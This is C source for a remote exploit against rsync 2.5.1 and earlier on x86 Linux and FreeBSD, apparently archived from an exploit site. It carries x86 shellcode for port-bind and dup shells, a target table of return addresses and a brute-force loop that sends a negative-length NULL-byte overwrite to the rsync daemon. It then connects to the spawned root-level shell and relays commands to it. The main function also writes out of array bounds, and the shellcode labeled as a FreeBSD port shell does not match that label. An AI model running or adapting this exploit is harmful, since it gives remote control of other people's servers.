/* 7350rsync - rsync <= 2.5.1 remote exploit - x86 ver.
 *
 * current version 2.5.5 but bug was silently fixed it appears
 * so vuln versions still ship, maybe security implemecations
 * were not recognized. 
 *
 * we can write NULL bites below &line[0] by supplying negative
 * lengths. read_sbuf calls buf[len] = 0. standard NULL byte off
 * by one kungf00 from there on.
 * 
 * originally by 7350, dupshell/FreeBSD by sprinkles
 *
 * 
 *
 */


 
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <netdb.h>
#include <errno.h>

#define MAXPATHLEN      4096
#define VERSION         "@RSYNCD: 26\n"

#define PORT            873
#define NULL_OFFSET     -48
#define STARTNULLBRUTE  -44
#define ENDNULLBRUTE    -56
#define BRUTEBASE       0xbfff7777
#define INCREMENT       512
#define ALLIGN          0 /* pop byte allignment */

#define SEND            "uname -a; id\n"

int open_s(char *h, int p);
int setup(int s);
int exploit(int s);
void quit(int s); /* garbage quit */

void handleshell(int closeme, int s);
void usage(char *n);

char linux_port[] = /* x86 linux portshell 30464 */
"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";

char linux_dup[] = /* x86 linux dupshell */
"\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\xcd\x80\x85\xc0\x74\x05\x93"
"\x31\xdb\xcd\x80\xb0\x42\xcd\x80\x31\xc0\xb0\x06\x31\xdb\xb3\x03"
"\x50\xcd\x80\x58\x4b\x79\xf9\xb0\x30\x43\xb3\x0f\x31\xc9\x41\x50"
"\xcd\x80\x58\x80\xe3\x03\x4b\x75\xf6\x43\xb0\x66\x89\xe1\x50\xcd"
"\x80\x92\x43\x6a\x10\x8d\x7c\x24\x04\x57\x52\xb8\x02\xff\x0b\x1a"
"\xfe\xc4\xab\x31\xc0\xab\xb0\x66\x89\xe1\x50\xcd\x80\x85\xc0\x78"
"\x4e\x58\xb3\x04\x6a\x05\x52\x89\xe1\x50\xcd\x80\x31\xc0\xb0\x06"
"\xcd\x80\x58\x31\xdb\xb0\x66\xb3\x05\x31\xc9\x51\x51\x52\x89\xe1"
"\x50\xcd\x80\x85\xc0\x78\x28\x93\x31\xc0\x40\x40\xcd\x80\x85\xc0"
"\x75\xda\x87\xda\xb0\x06\xcd\x80\x87\xda\xb0\x29\xcd\x80\xb0\x29"
"\xcd\x80\x31\xc0\xb0\x06\x31\xdb\xb3\x03\xcd\x80\x58\xeb\x1d\x31"
"\xc0\x31\xdb\x40\xcd\x80\x5b\x31\xc0\x88\x43\x07\x8d\x4b\x08\x89"
"\x19\x89\x41\x04\xb0\x0b\x31\xd2\xcd\x80\xeb\xe3\xe8\xe5\xff\xff"
"\xff/bin/sh";

char freebsd_port[] = /* x86 FreeBSD portshell 30464 */
"\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x16\xeb\x60\x5e\x56\x31\xc9"
"\xb1\x10\x89\xf7\xad\x35\xc0\x8a\xc0\x8a\xab\xe2\xf7\x5e\xeb\x4e"
"\xe8\xe7\xff\xff\xff\x95\xd9\x85\xd8\xe0\xf2\xe0\xf2\xe0\xf2\xe0"
"\xf2\xcd\x80\x8e\xc3\x83\xc1\xe0\xcf\xf0\xcc\xcd\x80\x8d\xc5\x84"
"\xcf\xe0\xcf\xf0\xcc\xe0\xb0\xed\xf2\xcd\x80\x8a\xc5\x89\xc4\xe0"
"\xa9\xf0\xf2\x85\xc5\x86\xaa\xa4\xff\xa4\xef\xcd\x80\x91\xdf\x89"
"\xde\xcd\x80\x85\xc0\x31\xc0\x40\x31\xdb\xcd\x80\xeb\x7c\x89\xe7"
"\x31\xdb\x43\x31\xc0\x50\x40\x50\x40\x50\xb0\x66\x89\xe1\x50\xcd"
"\x80\x92\x58\x5b\x5b\x5b\xb3\x03\x6a\x10\x57\x52\x50\xb8\x02\xff"
"\x1a\x0b\xfe\xc4\xab\xb8\xd8\x28\xf4\x7d\xab\x58\xcd\x80\x5b\x58"
"\x58\xb0\x04\x89\xf1\x31\xd2\xb2\x18\x01\xd6\xcd\x80\x31\xd2\xb2"
"\xff\x31\xc0\xb0\x03\x89\xe1\xcd\x80\x85\xc0\x76\xa8\x81\x39\x50"
"\x49\x4e\x47\x74\x06\x41\x48\x75\xf4\xeb\xe6\x89\xcf\x47\xc6\x07"
"\x4f\x87\xf7\xac\x3c\x0a\x75\xfb\x87\xfe\x91\xb1\x26\xf3\xa4\x91"
"\xb0\x04\x89\xfa\x29\xca\xcd\x80\xeb\xc3";

struct x_info {
        char *h;
        int p;
        char *module;
        int null_offset;
        u_long brutebase;
        int shell;
        int checkvuln;
        int nullbrute;
        int allign;
} rsx;
        
struct {
  char *desc;             /* description */
  int retdist;   
  unsigned int retaddr;         /* return address */
  char *shell;
} targets[] = {
  { "Linux Redhat 7.0 x86 / rsync 2.5.0", -0x1f0, 0x80e1d0, linux_port },
  { "Linux Redhat 7.0 x86 / rsync 2.5.1", -0x1f0, 0x80e23c, linux_dup },
  { "Linux Redhat 7.1 x86 / rsync 2.5.0", -0x1f0, 0x80e1c4, linux_port },
  { "Linux Redhat 7.1 x86 / rsync 2.5.1", -0x1f0, 0x80e230, linux_dup },
  { "Linux Redhat 7.2 x86 / rsync 2.5.0", -0x1f0, 0x80e1b8, linux_port },
  { "Linux Redhat 7.2 x86 / rsync 2.5.1", -0x1f0, 0x80e22c, linux_dup },
  { "Linux Mandrake 8.0 x86 / rsync 2.5.0", -0x1f0, 0x80e3a4, linux_port },
  { "Linux Mandrake 8.0 x86 / rsync 2.5.1", -0x1f0, 0x80e428, linux_dup },
  { "FreeBSD 4.2 x86 / rsync 2.5.0", -0x86, 0x80a248, freebsd_port },
  { "FreeBSD 4.2 x86 / rsync 2.5.1", -0x86, 0x80a29c, freebsd_port },
  { "FreeBSD 4.3 x86 / rsync 2.5.0", -0x86, 0x80a254, freebsd_port },
  { "FreeBSD 4.3 x86 / rsync 2.5.1", -0x86, 0x80a2a0, freebsd_port },
  { "FreeBSD 4.4 x86 / rsync 2.5.0", -0x86, 0x80a278, freebsd_port },
  { "FreeBSD 4.4 x86 / rsync 2.5.1", -0x86, 0x80a2b4, freebsd_port },
  { "FreeBSD 4.5 x86 / rsync 2.5.0", -0x86, 0x80a28c, freebsd_port },
  { "FreeBSD 4.5 x86 / rsync 2.5.1", -0x86, 0x80a2dc, freebsd_port },
}, *victim;

int
main(int argc, char **argv)
{
        int pipa[2];
        char c;
        int s,r;
        char buf[1024];
        char **p;
        u_long store;
        
        fprintf(stderr, "7350rsync - rsync <= 2.5.1 remote exploit - x86 ver.\n"
                        "-sc\n"
                        "\n");

        p = ((char **)targets) + 35;
        rsx.p = PORT;
        rsx.null_offset = NULL_OFFSET;
        rsx.brutebase = BRUTEBASE;
        rsx.nullbrute = 0;
        rsx.allign = ALLIGN;

        strcpy(buf, *p);
        p -= 4;
        strcat(buf, *p);
        pipa[2] = (int)buf;
        pipa[3] = (int)buf;

        if(argc == 1) { usage(argv[0]); return 0; }

        while((c = getopt(argc, argv, "h:p:m:d:r:t:")) != EOF) {
                switch(c) {
                        case 'h':
                                rsx.h = optarg;
                                break;
                        case 'p':
                                rsx.p = atoi(optarg);
                                break;
                        case 'm':
                                rsx.module = optarg;
                                break;
                        case 'd':
                               rsx.null_offset = atoi(optarg);
                                break;
                        case 'r':
                                rsx.brutebase = strtoul(optarg, (char **)optarg+strlen(optarg), 16);
                                break;
                        case 't':
                                if(atoi(optarg) < 1 || atoi(optarg) > sizeof(targets) / sizeof(targets[0]))
                                  usage(argv[0]);
                                victim = &targets[atoi(optarg) - 1];
                                break;
                        default:
                                usage(argv[0]);
                                return 0;
                }
        }
        
        if(optind == argc)
          { usage(argv[0]); return 0; }
  
        rsx.h = argv[optind++];
        /* NULL byte brute wrap */
        
        store = rsx.brutebase;
        
        if(rsx.nullbrute) 
                for(rsx.null_offset = STARTNULLBRUTE; rsx.null_offset >= ENDNULLBRUTE; rsx.null_offset--) {
                        fprintf(stderr, "\noffset: %d\n", rsx.null_offset);             
                        /* start run -- cuten this up with some connectback shellcode */
                        for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
                                if((s = open_s(rsx.h, rsx.p)) < 0) {
                                        fprintf(stderr, "poop..bye\n");
                                        return 1;
                                }
                          
                          if((r = setup(s)) > 0)
                            {
                              if((r = exploit(s)) > 0)             
                                handleshell(s, rsx.shell);
                            }
                          else
                            return 1;
                        }
                        rsx.brutebase = store;                  
                }        
        

        for(rsx.checkvuln = 1; rsx.brutebase <= 0xbfffffff; rsx.brutebase += INCREMENT) {
                if((s = open_s(rsx.h, rsx.p)) < 0) {
                        fprintf(stderr, "poop..bye\n");
                        return 1;
                }

                if((r = setup(s)) > 0)
            {
              
                        if(exploit(s) > 0)
                                handleshell(s, rsx.shell);
            }
          else
            return 1;
        }


        fprintf(stderr, "No luck...bye\n");     
        return 1;
}

void
quit(int s)
{
        /* we just write a garbage quit to make the remote end the process */
        /* very crude but who cares */
        write(s, "QUIT\n", 5);
        close(s);
}  

int
setup(int s)
{
        /* we just dump our setup info on the socket. kludge */
        
        char out[512], *check;
        long version = 0;
        
        
        if(rsx.checkvuln) {
                rsx.checkvuln = 0; /* just check once */
                
                /* get version reply -- vuln check */
                memset(out, '\0', sizeof(out));
                read(s, out, sizeof(out)-1);
                if((check = strchr(out, (int)':')) != NULL) {
                        version = strtoul((char *)check+1, (char **)check+3, 0);
                        if(version >= 26) {
                          fprintf(stderr, "target is not vulnerable (version: %lu)\n", version);
                          return -1;
                        }
                }
                else {
                        fprintf(stderr, "did not get version reply..aborting\n");
                        quit(s);
                        return -1;
                }
                
                fprintf(stderr, "Target appears to be vulnerable..continue attack\n");
        }
        
        /* our version string */        
        if(write(s, VERSION, strlen(VERSION)) < 0) return -1;

        /* the module we supposedly want to retrieve */
        memset(out, '\0', sizeof(out));
        snprintf(out, sizeof(out)-1, "%s\n", rsx.module);
        if(write(s, out, strlen(out)) < 0) return -1;
        if(write(s, "--server\n", 9) < 0) return -1;
        if(write(s, "--sender\n", 9) < 0) return -1;
        if(write(s, ".\n", 2) < 0) return -1;
        /* send module name once more */
        if(write(s, out, strlen(out)) < 0) return -1;
        /* send newline */
        if(write(s, "\n", 1) < 0) return -1;

        return 1;
}

int
exploit(int s) 
{
        
        char x_buf[MAXPATHLEN], b[4];
        int i;

        /* sleep(15); */

        memset(x_buf, 0x90, ((MAXPATHLEN/2)-strlen(victim->shell)));
        memcpy(x_buf+((MAXPATHLEN/2)-strlen(victim->shell)), victim->shell, strlen(victim->shell));
        /* allign our address bytes for the pop if needed */
        for(i=(MAXPATHLEN/2); i<((MAXPATHLEN/2)+rsx.allign);i++)
                x_buf[i] = 'x';
        for(i=((MAXPATHLEN/2)+rsx.allign); i<MAXPATHLEN; i+=4)
                *(long *)&x_buf[i] = rsx.brutebase;
        *(int *)&b[0] = (MAXPATHLEN-1);
        if(write(s, b, 4) < 0) return -1;
        if(write(s, x_buf, (MAXPATHLEN-1)) < 0) return -1;
        /* send NULL byte offset from &line[0] to read_sbuf() ebp */
        *(int *)&b[0] = rsx.null_offset;
        if(write(s, b, 4) < 0) return -1;
        /* let rsync know it can go ahead and own itself now */
        memset(b, '\0', 4);
        if(write(s, b, 4) < 0) return -1;

        /* zzz for shell setup */
        usleep(50000);
        
        /* check for our shell -- (mod this to be connectback friendly bruteforce) */
        fprintf(stderr, ";");
        if((rsx.shell = open_s(rsx.h, 30464)) < 0) {
                if(rand() % 2)
                        fprintf(stderr, "P");
                else
                        fprintf(stderr, "p");
                quit(s);
                return -1;
        }
        
        fprintf(stderr, "\n\nSuccess! (ret: %08x offset: %d)\n\n", (int)rsx.brutebase, rsx.null_offset);
        return 1;       
}
        
void
usage(char *n) {
  int i;
  fprintf(stderr, "usage: %s [options] <hostname>\n"
          "\nOptions:\n"
          "\t-m module\tmodule to request\n"
          "\t-p port\t\tport connecting to (default: 873)\n"
          "\t-d dist\t\tret - buf distance\n"
          "\t-r ret\t\treturn address\n"
          "\t-t target\tselect target\n", n);
  for(i = 0; i < sizeof(targets) / sizeof(targets[0]); i++)
    fprintf(stderr, "\t\t\t(%u) %s, %d, %08x\n", i + 1, targets[i].desc, targets[i].retdist, targets[i].retaddr);
    
  
}
        

int
open_s(char *h, int p)
{
        struct sockaddr_in remote;
        struct hostent *iplookup;
        char *ipaddress;
        int sfd;

        if((iplookup = gethostbyname(h)) == NULL) {
                perror("gethostbyname");
                return -1;
        }

        ipaddress = (char *)inet_ntoa(*((struct in_addr *)iplookup->h_addr));
        sfd = socket(AF_INET, SOCK_STREAM, 0);

        remote.sin_family = AF_INET;
        remote.sin_addr.s_addr = inet_addr(ipaddress);
        remote.sin_port = htons(p);
        memset(&(remote.sin_zero), '\0', 8);

        if(connect(sfd, (struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) return -1;
        
        return sfd;
}

void
handleshell(int closeme, int s)   
{
        char in[512], out[512];
        fd_set fdset;
        
        close(closeme);
        
        if(write(s, SEND, strlen(SEND)) < 0 ) {
                fprintf(stderr, "write error\n");
                return;
        }       
 
        while(1) {
        
                FD_ZERO(&fdset);
                FD_SET(fileno(stdin), &fdset);
                FD_SET(s, &fdset);
        
                select(s+1, &fdset, NULL, NULL, NULL);
        
                if(FD_ISSET(fileno(stdin), &fdset)) {
                        memset(out, '\0', sizeof(out));
                        if(read(0, out, (sizeof(out)-1)) < 0) {
                                fprintf(stderr, "read error\n");
                                exit(1);
                        }
                        if(!strncmp(out, "exit", 4)) {
                                write(s, out, strlen(out));
                                quit(s);
                                exit(0);
                        }
                        if(write(s, out, strlen(out)) < 0) {
                                fprintf(stderr, "write error\n");
                                exit(1);
                        }
                }
        
                if(FD_ISSET(s, &fdset)) {
                        memset(in, '\0', sizeof(in));
                        if(read(s, in, (sizeof(in)-1)) < 0) {
                                fprintf(stderr, "read error\n");
                                exit(1);
                        }
                        fprintf(stderr, "%s", in);
                }
        }
}

// milw0rm.com [2002-01-01]
